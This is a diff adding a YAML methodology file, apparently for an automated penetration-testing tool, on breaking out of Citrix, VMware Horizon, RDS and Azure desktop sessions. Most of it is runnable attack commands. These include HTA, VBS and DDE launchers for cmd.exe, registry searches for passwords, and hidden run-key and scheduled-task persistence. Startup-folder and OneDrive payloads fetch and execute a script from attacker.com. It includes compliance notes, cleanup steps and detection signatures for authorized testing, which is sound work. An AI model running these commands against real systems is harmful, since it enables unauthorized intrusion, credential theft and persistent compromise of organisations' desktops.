@@ -1,0 +1,792 @@
+id: comprehensive_vdi_breakout
+name: "Comprehensive VDI/RDP Breakout and Post-Exploitation"
+category: post_exploitation
+description: "Advanced methodology for breaking out of VDI, RDP, and restricted desktop environments including Citrix, VMware Horizon, Microsoft RDS, and Azure Virtual Desktop"
+estimated_duration: "4-8h"
+risk_level: high
+stealth_level: moderate
+
+# Asset property-based triggers
+asset_triggers:
+  - id: vdi_environment_detected
+    asset_type: host
+    conditions:
+      - or:
+        - property: "software_installed"
+          operator: "contains"
+          value: "citrix"
+        - property: "software_installed"
+          operator: "contains"
+          value: "vmware horizon"
+        - property: "software_installed"
+          operator: "contains"
+          value: "terminal services"
+        - property: "software_installed"
+          operator: "contains"
+          value: "azure virtual desktop"
+        - property: "rdp_enabled"
+          operator: "equals"
+          value: true
+    trigger_name: "Advanced VDI Breakout"
+    description: "Trigger comprehensive VDI breakout testing"
+    priority: 9
+
+  - id: citrix_environment_detected
+    asset_type: host
+    conditions:
+      - property: "software_installed"
+        operator: "contains"
+        value: "citrix"
+    trigger_name: "Citrix Specific Breakout"
+    description: "Trigger Citrix-specific breakout techniques"
+    priority: 8
+
+  - id: rdp_session_detected
+    asset_type: host
+    conditions:
+      - property: "rdp_enabled"
+        operator: "equals"
+        value: true
+    trigger_name: "RDP Session Breakout"
+    description: "Trigger RDP-specific breakout techniques"
+    priority: 7
+
+# Methodology phases
+phases:
+  # Phase 1: Initial VDI Environment Assessment
+  - id: vdi_environment_assessment
+    name: "VDI Environment Assessment"
+    description: "Identify and assess the specific VDI/RDP environment"
+    order: 1
+    steps:
+      - id: identify_vdi_platform
+        name: "Identify VDI Platform"
+        type: command_group
+        description: "Determine specific VDI platform and version"
+        order: 1
+        commands:
+          - platform: windows
+            command: |
+              # Citrix Detection
+              Get-Process | Where-Object {$_.ProcessName -match "citrix"}
+              Get-Service | Where-Object {$_.DisplayName -match "citrix"}
+              reg query "HKLM\SOFTWARE\Citrix"
+              Test-Path "C:\Program Files\Citrix"
+
+              # VMware Horizon Detection
+              Get-Process | Where-Object {$_.ProcessName -match "vmware"}
+              reg query "HKLM\SOFTWARE\VMware, Inc."
+              Test-Path "C:\Program Files\VMware"
+
+              # RDS/Terminal Services Detection
+              qwinsta
+              query session
+              reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"
+
+              # Azure Virtual Desktop Detection
+              reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" | findstr "Azure"
+            timeout: "2m"
+
+      - id: session_capabilities_enum
+        name: "Enumerate Session Capabilities"
+        type: command_group
+        description: "Check what capabilities are enabled for the session"
+        order: 2
+        commands:
+          - platform: windows
+            command: |
+              # Check clipboard redirection
+              Get-Clipboard -ErrorAction SilentlyContinue
+
+              # Check drive mappings
+              net use
+              Get-PSDrive
+
+              # Check printer redirection
+              Get-Printer
+
+              # Check USB redirection status
+              Get-PnpDevice | Where-Object {$_.Class -eq "USB"}
+
+              # Check audio redirection
+              Get-WmiObject -Class Win32_SoundDevice
+
+              # Check session configuration
+              qwinsta $env:SESSIONNAME
+            timeout: "2m"
+
+        asset_discovery:
+          search_patterns:
+            - pattern: "Citrix.*Agent"
+              asset_type: vdi_platform
+              confidence: 1.0
+              metadata:
+                platform: "citrix"
+                breakout_methods: ["dialog_exploitation", "ica_manipulation"]
+            - pattern: "VMware.*View"
+              asset_type: vdi_platform
+              confidence: 1.0
+              metadata:
+                platform: "vmware_horizon"
+                breakout_methods: ["unity_mode", "usb_redirection"]
+            - pattern: "Terminal.*Services"
+              asset_type: vdi_platform
+              confidence: 1.0
+              metadata:
+                platform: "microsoft_rds"
+                breakout_methods: ["resource_redirection", "clipboard_abuse"]
+
+  # Phase 2: Input/Output Channel Abuse
+  - id: io_channel_abuse
+    name: "Input/Output Channel Exploitation"
+    description: "Test and abuse I/O redirection features"
+    order: 2
+    steps:
+      - id: clipboard_abuse
+        name: "Clipboard Redirection Abuse"
+        type: command_group
+        description: "Test clipboard for data exfiltration and file transfer"
+        order: 1
+        commands:
+          - name: "Test Clipboard Text Transfer"
+            command: |
+              # Test large text transfer via clipboard
+              $largeText = "A" * 10000
+              Set-Clipboard -Value $largeText
+              Get-Clipboard
+          - name: "Test Clipboard File Transfer"
+            command: |
+              # Attempt to copy files via clipboard
+              Get-ChildItem C:\Windows\System32\drivers\etc\hosts | Set-Clipboard
+              Get-Clipboard -Format FileDropList -ErrorAction SilentlyContinue
+          - name: "Test Base64 Encoded File Transfer"
+            command: |
+              # Create test file and encode for clipboard transfer
+              "Test sensitive data" | Out-File -FilePath C:\temp\test.txt
+              $encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\temp\test.txt"))
+              Set-Clipboard -Value $encoded
+
+      - id: drive_mapping_abuse
+        name: "Drive Mapping Exploitation"
+        type: command_group
+        description: "Exploit client drive mappings"
+        order: 2
+        commands:
+          - name: "Enumerate Mapped Drives"
+            command: |
+              # Check for client drive mappings
+              net use
+              Get-PSDrive | Where-Object {$_.Provider -like "*FileSystem*"}
+              # Test RDP client drive access
+              dir \\tsclient\c 2>$null
+              dir \\tsclient\d 2>$null
+          - name: "Test Client Drive Access"
+            command: |
+              # Attempt to read client files
+              Get-ChildItem \\tsclient\c\Users -ErrorAction SilentlyContinue
+              # Attempt to write to client
+              "VDI Breakout Test" | Out-File -FilePath "\\tsclient\c\temp\breakout_test.txt" -ErrorAction SilentlyContinue
+          - name: "UNC Path Bypass Attempts"
+            command: |
+              # Try various UNC path formats
+              Test-Path "\\127.0.0.1\C$"
+              Test-Path "\\localhost\C$"
+              Test-Path "\\.\C:"
+
+      - id: usb_device_redirection
+        name: "USB Device Redirection Testing"
+        type: command_group
+        description: "Test USB pass-through capabilities"
+        order: 3
+        commands:
+          - name: "Enumerate USB Devices"
+            command: |
+              Get-PnpDevice | Where-Object {$_.Class -eq "USB"}
+              Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2}
+          - name: "Test USB Storage Access"
+            command: |
+              # Look for removable drives
+              Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2} | ForEach-Object {
+                Write-Host "Testing drive $($_.DeviceID)"
+                Get-ChildItem "$($_.DeviceID)\" -ErrorAction SilentlyContinue
+              }
+
+      - id: printer_redirection_abuse
+        name: "Printer Redirection Exploitation"
+        type: command_group
+        description: "Abuse printer redirection for file transfer"
+        order: 4
+        commands:
+          - name: "Enumerate Printers"
+            command: |
+              Get-Printer
+              Get-WmiObject Win32_Printer
+          - name: "Test Print to File"
+            command: |
+              # Create test document and print to file
+              "Sensitive VDI Data for Exfiltration" | Out-File -FilePath C:\temp\sensitive.txt
+              # Attempt to print to client-side PDF printer if available
+              Get-Printer | Where-Object {$_.Name -like "*PDF*" -or $_.Name -like "*File*"}
+
+  # Phase 3: Protocol Handler and File Association Exploits
+  - id: protocol_handler_exploits
+    name: "Protocol Handler and File Association Exploits"
+    description: "Exploit URI schemes and file associations to escape restrictions"
+    order: 3
+    steps:
+      - id: malicious_uri_schemes
+        name: "Malicious URI Scheme Testing"
+        type: manual
+        description: "Test various URI schemes for application launching"
+        order: 1
+        instructions: |
+          Test the following URI schemes in browsers, dialogs, or applications:
+
+          1. mailto: - May open Outlook or mail client
+          2. ftp:// - May open FTP client
+          3. telnet:// - May open telnet client
+          4. ms-settings: - Opens Windows Settings
+          5. shell:windows - Opens Windows Explorer
+          6. shell:System - Opens System folder
+          7. shell:Common Programs - Opens Programs folder
+          8. calculator: - Opens Calculator
+          9. ms-officeapp: - May open Office applications
+
+          Try in browser address bar, file dialogs, or hyperlinks in documents.
+
+      - id: shell_uri_exploitation
+        name: "Shell URI Exploitation"
+        type: command_group
+        description: "Use Windows shell URIs to access system directories"
+        order: 2
+        commands:
+          - name: "Test Shell URIs"
+            command: |
+              # Test various shell URIs (these may work in Explorer address bar)
+              $shellURIs = @(
+                "shell:windows",
+                "shell:System",
+                "shell:Common Programs",
+                "shell:Personal",
+                "shell:SendTo",
+                "shell:Desktop",
+                "shell:Common Desktop"
+              )
+              foreach ($uri in $shellURIs) {
+                Write-Host "Testing: $uri"
+                # Note: These would typically be tested manually in Explorer
+              }
+
+      - id: file_extension_abuse
+        name: "File Extension Association Abuse"
+        type: command_group
+        description: "Exploit file type associations for execution"
+        order: 3
+        commands:
+          - name: "Create Test Files with Various Extensions"
+            command: |
+              # Create files with different extensions to test handlers
+              @('.html', '.url', '.rdp', '.ica', '.vbs', '.js', '.hta', '.lnk') | ForEach-Object {
+                $content = switch ($_) {
+                  '.html' { '<html><body><script>alert("HTML executed")</script></body></html>' }
+                  '.url' { "[InternetShortcut]`nURL=https://example.com" }
+                  '.hta' { '<html><head><HTA:APPLICATION ID="test"></head><body><script>new ActiveXObject("WScript.Shell").Run("cmd.exe");</script></body></html>' }
+                  '.vbs' { 'CreateObject("WScript.Shell").Run "cmd.exe"' }
+                  '.js' { 'new ActiveXObject("WScript.Shell").Run("cmd.exe");' }
+                  default { "Test content for $_" }
+                }
+                $content | Out-File -FilePath "C:\temp\test$_"
+                Write-Host "Created: C:\temp\test$_"
+              }
+          - name: "Test File Associations"
+            command: |
+              # Check what programs are associated with file types
+              cmd /c assoc .html
+              cmd /c assoc .hta
+              cmd /c assoc .vbs
+              cmd /c assoc .js
+
+  # Phase 4: Advanced Application Escape Techniques
+  - id: application_escape
+    name: "Advanced Application Escape Techniques"
+    description: "Comprehensive application escape methods"
+    order: 4
+    steps:
+      - id: dialog_box_exploitation
+        name: "File Dialog Box Exploitation"
+        type: manual
+        description: "Use Open/Save dialogs to access system"
+        order: 1
+        instructions: |
+          For any available application (Notepad, Office, etc.):
+
+          1. Open File -> Open or Save As dialog
+          2. In filename field, type: C:\Windows\System32\cmd.exe and press Enter
+          3. Navigate to C:\Windows\System32 and try to execute cmd.exe
+          4. Right-click in dialog and select "Open in new window"
+          5. Try browsing to restricted directories
+          6. Create new folders/files via right-click context menu
+          7. Create shortcuts pointing to system directories
+          8. Use Properties -> Open File Location on shortcuts
+
+      - id: office_application_abuse
+        name: "Microsoft Office Application Abuse"
+        type: command_group
+        description: "Exploit Office applications for breakout"
+        order: 2
+        commands:
+          - name: "Word VBA Macro Execution"
+            command: |
+              # Create Word document with macro (manual step)
+              $vbaCode = @"
+              Sub RunCmd()
+                  Shell "cmd.exe", vbNormalFocus
+              End Sub
+              "@
+              Write-Host "VBA Macro code to insert:"
+              Write-Host $vbaCode
+          - name: "Excel DDE/Formula Execution"
+            command: |
+              # Create Excel with DDE formula (manual step)
+              $ddeFormula = '=cmd|"/c calc.exe"!A1'
+              Write-Host "Excel DDE Formula: $ddeFormula"
+          - name: "PowerPoint Action Settings"
+            command: |
+              Write-Host "In PowerPoint, use Action Settings to run programs on click"
+
+      - id: browser_escape_techniques
+        name: "Browser Escape Techniques"
+        type: command_group
+        description: "Escape via browser functionality"
+        order: 3
+        commands:
+          - name: "Local File Access via Browser"
+            command: |
+              # Test local file access (manual - use in browser address bar)
+              $fileURLs = @(
+                "file://C:/",
+                "file://C:/Windows",
+                "file://C:/Windows/System32",
+                "file://%USERPROFILE%",
+                "file://127.0.0.1/C$"
+              )
+              Write-Host "Test these URLs in browser address bar:"
+              $fileURLs | ForEach-Object { Write-Host $_ }
+          - name: "Browser Developer Tools Access"
+            command: |
+              Write-Host "Test browser developer tools access:"
+              Write-Host "1. Press F12 for developer tools"
+              Write-Host "2. Try console execution: new ActiveXObject('WScript.Shell').Run('cmd.exe')"
+              Write-Host "3. Test Ctrl+U for view source"
+              Write-Host "4. Test Ctrl+P for print dialog"
+
+      - id: accessibility_feature_abuse
+        name: "Accessibility Feature Abuse"
+        type: command_group
+        description: "Exploit accessibility features for breakout"
+        order: 4
+        commands:
+          - name: "Sticky Keys Exploitation"
+            command: |
+              # Test Sticky Keys (press Shift 5 times)
+              Write-Host "Press Shift 5 times to trigger Sticky Keys dialog"
+              Write-Host "Look for links in dialog that open Explorer or web pages"
+          - name: "On-Screen Keyboard Access"
+            command: |
+              # Try to launch On-Screen Keyboard
+              Start-Process osk.exe -ErrorAction SilentlyContinue
+          - name: "Magnifier Tool Access"
+            command: |
+              # Try to launch Magnifier
+              Start-Process magnify.exe -ErrorAction SilentlyContinue
+
+  # Phase 5: Advanced VDI-Specific Breakouts
+  - id: vdi_specific_breakouts
+    name: "VDI Platform-Specific Breakouts"
+    description: "Platform-specific breakout techniques"
+    order: 5
+    steps:
+      - id: citrix_specific_breakouts
+        name: "Citrix-Specific Breakout Techniques"
+        type: command_group
+        description: "Citrix XenApp/XenDesktop specific exploits"
+        order: 1
+        commands:
+          - name: "Citrix Hotkey Testing"
+            command: |
+              Write-Host "Test Citrix-specific hotkeys:"
+              Write-Host "Ctrl+F1 - Session information"
+              Write-Host "Shift+F2 - Toggle between sessions"
+              Write-Host "Ctrl+Alt+Break - Toggle full screen"
+          - name: "ICA File Manipulation"
+            command: |
+              # Check for ICA files and configuration
+              Get-ChildItem -Path $env:USERPROFILE -Filter "*.ica" -Recurse -ErrorAction SilentlyContinue
+              # Look for Citrix configuration
+              reg query "HKCU\Software\Citrix" -ErrorAction SilentlyContinue
+          - name: "Published App Breakout"
+            command: |
+              # If in published app mode, try to break out
+              Write-Host "Testing published application breakout methods"
+              Write-Host "1. Try File->Open dialogs in published apps"
+              Write-Host "2. Look for Help->About dialogs with links"
+              Write-Host "3. Try Print->Print to File options"
+
+      - id: vmware_horizon_breakouts
+        name: "VMware Horizon Breakout Techniques"
+        type: command_group
+        description: "VMware Horizon specific exploits"
+        order: 2
+        commands:
+          - name: "Unity Mode Exploitation"
+            command: |
+              Write-Host "Testing VMware Unity mode breakout:"
+              Write-Host "1. Test drag-and-drop between local and remote"
+              Write-Host "2. Check for seamless window integration exploitation"
+              Write-Host "3. Test local application launching from VDI"
+          - name: "VMware Tools Exploitation"
+            command: |
+              # Check VMware Tools status
+              Get-Service VMTools -ErrorAction SilentlyContinue
+              Get-Process vmtoolsd -ErrorAction SilentlyContinue
+              # Check for VMware-specific vulnerabilities
+              reg query "HKLM\SOFTWARE\VMware, Inc.\VMware Tools" -ErrorAction SilentlyContinue
+
+      - id: rds_specific_breakouts
+        name: "RDS-Specific Breakout Techniques"
+        type: command_group
+        description: "Microsoft RDS specific exploits"
+        order: 3
+        commands:
+          - name: "Multi-User Session Exploitation"
+            command: |
+              # Enumerate other sessions
+              qwinsta
+              query user
+              # Check if can interact with other sessions
+              Write-Host "Testing multi-user session interaction"
+          - name: "RDP Client Resource Redirection"
+            command: |
+              # Test resource redirection
+              net use \\tsclient\c
+              dir \\tsclient\c
+              # Test printer redirection
+              rundll32 printui.dll,PrintUIEntry /y
+
+  # Phase 6: Cloud Storage and Sync Exploitation
+  - id: cloud_sync_exploitation
+    name: "Cloud Storage and Sync Exploitation"
+    description: "Exploit cloud sync services for data exfiltration"
+    order: 6
+    steps:
+      - id: onedrive_exploitation
+        name: "OneDrive/SharePoint Exploitation"
+        type: command_group
+        description: "Exploit OneDrive sync for exfiltration"
+        order: 1
+        commands:
+          - name: "OneDrive Detection and Testing"
+            command: |
+              # Check for OneDrive
+              Get-Process OneDrive -ErrorAction SilentlyContinue
+              Test-Path "$env:USERPROFILE\OneDrive"
+              # Test file placement in OneDrive
+              if (Test-Path "$env:USERPROFILE\OneDrive") {
+                "VDI Breakout Test - $(Get-Date)" | Out-File "$env:USERPROFILE\OneDrive\breakout_test.txt"
+                Write-Host "Test file placed in OneDrive"
+              }
+          - name: "SharePoint Access Testing"
+            command: |
+              # Check for SharePoint integration
+              reg query "HKCU\Software\Microsoft\Office" | findstr SharePoint
+              # Test web-based SharePoint access
+              Write-Host "Check if SharePoint is accessible via browser"
+
+      - id: other_cloud_services
+        name: "Other Cloud Service Exploitation"
+        type: command_group
+        description: "Test other cloud sync services"
+        order: 2
+        commands:
+          - name: "Google Drive Detection"
+            command: |
+              Get-Process "GoogleDriveSync" -ErrorAction SilentlyContinue
+              Test-Path "$env:USERPROFILE\Google Drive"
+          - name: "Dropbox Detection"
+            command: |
+              Get-Process Dropbox -ErrorAction SilentlyContinue
+              Test-Path "$env:USERPROFILE\Dropbox"
+          - name: "Cloud Service Web Access"
+            command: |
+              Write-Host "Test web access to cloud services:"
+              Write-Host "1. Try accessing Google Drive via browser"
+              Write-Host "2. Try accessing Dropbox via browser"
+              Write-Host "3. Check for saved cloud service credentials"
+
+  # Phase 7: Active Directory and Domain Exploitation
+  - id: ad_domain_exploitation
+    name: "Active Directory and Domain Exploitation"
+    description: "Exploit AD integration and domain trust"
+    order: 7
+    steps:
+      - id: domain_enumeration
+        name: "Domain Information Gathering"
+        type: command_group
+        description: "Gather AD and domain information"
+        order: 1
+        commands:
+          - name: "Basic Domain Information"
+            command: |
+              # Domain information
+              $env:USERDOMAIN
+              $env:USERDNSDOMAIN
+              net user /domain
+              net group /domain
+              nltest /domain_trusts
+          - name: "Group Policy Information"
+            command: |
+              # Check applied GPOs
+              gpresult /R
+              gpresult /Z | Out-File C:\temp\gpresult.txt
+          - name: "Domain Controller Discovery"
+            command: |
+              # Find domain controllers
+              nslookup -type=SRV _ldap._tcp.dc._msdcs.$env:USERDNSDOMAIN
+              nltest /dclist:$env:USERDOMAIN
+
+      - id: credential_hunting
+        name: "Credential Hunting in VDI"
+        type: command_group
+        description: "Hunt for cached credentials"
+        order: 2
+        commands:
+          - name: "Windows Credential Manager"
+            command: |
+              # Check stored credentials
+              cmdkey /list
+              # Access Credential Manager GUI
+              rundll32.exe keymgr.dll,KRShowKeyMgr
+          - name: "Browser Credential Extraction"
+            command: |
+              # Check browser saved passwords (manual process)
+              Write-Host "Check browser saved passwords manually"
+              Write-Host "Chrome: Settings -> Passwords"
+              Write-Host "Firefox: Settings -> Privacy & Security -> Saved Logins"
+          - name: "Registry Credential Search"
+            command: |
+              # Search registry for potential credentials
+              reg query HKCU /f password /t REG_SZ /s
+              reg query HKLM /f password /t REG_SZ /s
+
+  # Phase 8: Advanced Persistence in VDI
+  - id: vdi_persistence
+    name: "VDI Environment Persistence"
+    description: "Establish persistence in VDI environments"
+    order: 8
+    steps:
+      - id: profile_based_persistence
+        name: "Profile-Based Persistence"
+        type: command_group
+        description: "Persistence through user profile"
+        order: 1
+        commands:
+          - name: "Startup Folder Persistence"
+            command: |
+              # Add to startup folder
+              $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+              "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`"" | Out-File "$startupPath\updater.bat"
+          - name: "Registry Run Key Persistence"
+            command: |
+              # Add registry run key
+              reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdater" /d "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\update.ps1" /f
+          - name: "Office Template Persistence"
+            command: |
+              # Place macro in Office startup template
+              $officePath = "$env:APPDATA\Microsoft\Templates"
+              Write-Host "Place malicious Office template in: $officePath"
+
+      - id: scheduled_task_persistence
+        name: "Scheduled Task Persistence"
+        type: command_group
+        description: "Use scheduled tasks for persistence"
+        order: 2
+        commands:
+          - name: "User-Level Scheduled Task"
+            command: |
+              # Create scheduled task for current user
+              $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\maintenance.ps1"
+              $trigger = New-ScheduledTaskTrigger -AtLogOn
+              $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+              Register-ScheduledTask -TaskName "UserMaintenance" -Action $action -Trigger $trigger -Settings $settings -Force
+
+      - id: cloud_persistence
+        name: "Cloud-Based Persistence"
+        type: command_group
+        description: "Persistence through cloud services"
+        order: 3
+        commands:
+          - name: "OneDrive Sync Persistence"
+            command: |
+              # Place persistent payload in OneDrive
+              if (Test-Path "$env:USERPROFILE\OneDrive") {
+                $payload = @"
+              powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
+              "@
+                $payload | Out-File "$env:USERPROFILE\OneDrive\Documents\system_update.bat"
+                Write-Host "Persistent payload placed in OneDrive"
+              }
+
+# Chain triggers based on successful techniques
+chain_triggers:
+  - conditions:
+      - outcome: "vdi_breakout_successful"
+        value: true
+    trigger: lateral_movement
+    priority: 9
+    description: "Begin lateral movement after VDI breakout"
+
+  - conditions:
+      - outcome: "domain_credentials_obtained"
+        value: true
+    trigger: active_directory_enumeration
+    priority: 10
+    description: "Enumerate Active Directory with obtained credentials"
+
+  - conditions:
+      - outcome: "cloud_access_gained"
+        value: true
+    trigger: cloud_enumeration
+    priority: 8
+    description: "Enumerate cloud resources after gaining access"
+
+# Outcome schema
+outcome_schema:
+  vdi_breakout_successful:
+    type: boolean
+    description: "Whether VDI environment breakout was successful"
+    critical: true
+
+  platform_identified:
+    type: string
+    enum: ["citrix", "vmware_horizon", "microsoft_rds", "azure_virtual_desktop", "unknown"]
+    description: "Identified VDI platform"
+
+  io_channels_exploited:
+    type: array
+    items: string
+    description: "Successfully exploited I/O channels (clipboard, drive_mapping, usb, printer)"
+
+  file_exfiltration_possible:
+    type: boolean
+    description: "Whether file exfiltration was possible"
+
+  cloud_sync_access:
+    type: boolean
+    description: "Whether cloud sync services were accessible"
+
+  domain_credentials_obtained:
+    type: array
+    items:
+      type: object
+      properties:
+        username: string
+        password: string
+        domain: string
+        hash: string
+    description: "Domain credentials obtained from VDI"
+
+  persistence_established:
+    type: array
+    items: string
+    description: "Types of persistence established"
+
+  lateral_movement_possible:
+    type: boolean
+    description: "Whether lateral movement from VDI is possible"
+
+  client_side_compromise:
+    type: boolean
+    description: "Whether client-side compromise was achieved"
+
+# Detection signatures for blue team
+detection_signatures:
+  - name: "VDI Breakout Attempt - Dialog Box"
+    pattern: "cmd.exe launched from file dialog"
+    log_source: "process_creation"
+    severity: "high"
+
+  - name: "Clipboard Abuse Detection"
+    pattern: "Large clipboard data transfer"
+    log_source: "clipboard_monitoring"
+    severity: "medium"
+
+  - name: "UNC Path Access Attempt"
+    pattern: "Access to \\\\tsclient\\ or \\\\127.0.0.1\\"
+    log_source: "file_system"
+    severity: "medium"
+
+  - name: "Office Macro Execution"
+    pattern: "VBA macro with Shell execution"
+    log_source: "office_logs"
+    severity: "high"
+
+  - name: "Browser Local File Access"
+    pattern: "file:// protocol access to system directories"
+    log_source: "browser_logs"
+    severity: "medium"
+
+  - name: "Scheduled Task Creation"
+    pattern: "Suspicious scheduled task created by user"
+    log_source: "system_logs"
+    severity: "high"
+
+# Risk assessment and compliance
+compliance_notes:
+  - "Ensure all VDI breakout tests are within authorized scope"
+  - "Document all file transfers and data access for compliance"
+  - "Avoid disrupting other VDI users in multi-tenant environments"
+  - "Follow data handling procedures for any harvested credentials"
+  - "Restore all persistence mechanisms after testing"
+
+# Cleanup procedures
+cleanup_procedures:
+  - description: "Remove persistence mechanisms"
+    commands:
+      - platform: windows
+        command: |
+          # Remove startup items
+          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\updater.bat" -Force -ErrorAction SilentlyContinue
+          # Remove registry entries
+          reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdater" /f
+          # Remove scheduled tasks
+          Unregister-ScheduledTask -TaskName "UserMaintenance" -Confirm:$false -ErrorAction SilentlyContinue
+
+  - description: "Clean test files and artifacts"
+    commands:
+      - platform: windows
+        command: |
+          # Remove test files
+          Remove-Item C:\temp\test.* -Force -ErrorAction SilentlyContinue
+          Remove-Item C:\temp\breakout_test.txt -Force -ErrorAction SilentlyContinue
+          # Clear clipboard
+          Set-Clipboard -Value ""
+
+# Suppression options
+suppression:
+  available_scopes:
+    - scope: "methodology"
+      description: "Skip VDI breakout testing entirely"
+      conditions: ["VDI not in scope", "Limited engagement scope"]
+    - scope: "platform"
+      description: "Skip specific VDI platform testing"
+      conditions: ["Platform not present", "Out of scope"]
+    - scope: "technique"
+      description: "Skip specific breakout techniques"
+      conditions: ["High risk technique", "Production impact concern"]
+
+# Deduplication
+deduplication:
+  strategy: "signature_based"
+  signature_fields: ["host_id", "vdi_platform", "session_id"]
+  cooldown_period: "24h"
+  max_executions: 2
